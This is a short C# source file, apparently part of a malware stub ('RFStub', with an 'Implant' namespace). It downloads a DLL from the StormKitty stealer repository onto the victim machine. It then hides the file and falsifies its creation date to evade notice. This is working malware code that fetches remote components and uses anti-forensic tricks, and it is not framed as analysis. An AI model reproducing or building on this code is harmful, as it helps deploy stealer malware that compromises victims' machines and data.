using System;
using System.IO;
using System.Net;
using RFStub.Implant;

namespace RFStub;

internal sealed class Libs
{
	public static string ZipLib = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll";

	public static bool LoadRemoteLibrary(string library)
	{
		string text = Path.Combine(Path.GetDirectoryName(Startup.ExecutablePath), Path.GetFileName(new Uri(library).LocalPath));
		if (!File.Exists(text))
		{
			try
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(library, text);
			}
			catch (WebException)
			{
				return false;
			}
			Startup.HideFile(text);
			Startup.SetFileCreationDate(text);
		}
		return File.Exists(text);
	}
}
